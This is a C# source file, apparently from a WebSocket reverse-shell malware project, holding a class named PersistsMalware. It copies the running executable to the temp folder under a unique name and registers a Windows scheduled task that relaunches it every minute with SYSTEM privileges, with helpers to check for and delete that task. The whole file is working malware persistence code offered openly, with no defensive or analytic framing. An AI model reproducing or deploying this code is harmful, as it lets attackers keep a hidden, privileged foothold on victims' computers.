using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using static Emgu.Util.Platform;
using static System.Runtime.InteropServices.JavaScript.JSType;

namespace WebSocketReverseShellDotNet.utils
{
    internal class PersistsMalware
    {


        public static bool CreatePersistenceWindows()
        {
            if (!System.Runtime.InteropServices.RuntimeInformation.OSDescription.ToLower().Contains("windows"))
            {
                Console.WriteLine("This is not windows");
                return false;
            }

            try
            {
                if (!CheckIfWindowsTaskIsCreated())
                {
                    string exeFileMovedToPersistenceLocation = CopyExeFileToTmpLocation();
                    // Console.WriteLine(exeFileMovedToPersistenceLocation);
                    string persistenceCommandResponse = CreateWindowsTask(exeFileMovedToPersistenceLocation);
                    // Console.WriteLine(persistenceCommandResponse);
                    if (persistenceCommandResponse.ToLower().Contains("success"))
                    {
                        return true;
                    }else
                    {
                        Console.WriteLine("Error creating Windows persistence: " + persistenceCommandResponse);
                        return false;
                    }
                }
                else
                {
                    Console.WriteLine("Persistence is already established");
                    return false;
                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Error creating Windows persistence: " + e.Message);
                return false;
            }

        }



        private static bool CheckIfWindowsTaskIsCreated()
        {

            string checkCommand = DataManuplationUtil.RemoveFirstLines(
                SystemCommandUtil.RunCommand("schtasks | findstr " + Constants.PERSISTENCE_WINDOWS_TASK), 2);


            Console.WriteLine(checkCommand);
            if (checkCommand.ToLower().Contains(Constants.PERSISTENCE_WINDOWS_TASK.ToLower()))
            {
                // System.out.println("[+] found task");
                return true;
            }
            else
                return false;

        }

        public static bool StopWindowsPersistence()
        {
            if (!System.Runtime.InteropServices.RuntimeInformation.OSDescription.ToLower().Contains("windows"))
            {
                return false;
            }

            string commandResponse = DataManuplationUtil.RemoveFirstLines(EraseWindowsTask(), 2);

            if (commandResponse.ToUpper().Contains("SUCCESS"))
            {
                return true;
            }

            return false;
        }

        private static string CreateWindowsTask(string fileLocation)
        {
            //        this command will create a windows scheduler task which will run the exe file every minute with admin privileges
            return SystemCommandUtil.RunCommand(
                    "schtasks /create /tn \"" + Constants.PERSISTENCE_WINDOWS_TASK + "\" /tr \"" + fileLocation + "\"" +
                            " /sc minute /mo 1 /ru \"SYSTEM\"");

        }

        private static string EraseWindowsTask()
        {
            //        this command will erase a windows scheduler task

            return SystemCommandUtil.RunCommand(
                    "schtasks /delete /tn \"" + Constants.PERSISTENCE_WINDOWS_TASK + "\" /f");

        }

        static string CopyExeFileToTmpLocation()
        {
            try
            {
                var exeFilePath = Application.ExecutablePath;
                Console.WriteLine($"{exeFilePath}: file path");

                // Ensure that the path is not empty
                if (string.IsNullOrEmpty(exeFilePath))
                {
                    Console.Error.WriteLine("Error getting the path of the executing assembly.");
                    throw new ApplicationException("Error getting the path of the executing assembly.");
                }


                FileInfo sourceFile = new FileInfo(exeFilePath);
                string tempDirPath = Path.GetTempPath();
                DirectoryInfo tempDir = new DirectoryInfo(tempDirPath);

                // Generate a unique name for the copied EXE file
                string copiedExeFileName = GenerateUniqueFileName(sourceFile.Name);
                FileInfo destinationFile = new FileInfo(Path.Combine(tempDir.FullName, copiedExeFileName));

                // Copy the EXE file to the temporary directory
                File.Copy(sourceFile.FullName, destinationFile.FullName, true);

                return destinationFile.FullName;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Error copying the EXE file: " + e.Message);
                throw new ApplicationException("File was not copied", e);
            }
        }

        static string GenerateUniqueFileName(string fileName)
        {
            // Implement your logic to generate a unique file name
            // For example, you can add a timestamp or use a GUID
            return $"{Path.GetFileNameWithoutExtension(fileName)}_{DateTime.Now:yyyyMMddHHmmss}_{Guid.NewGuid()}{Path.GetExtension(fileName)}";
        }




    }
}
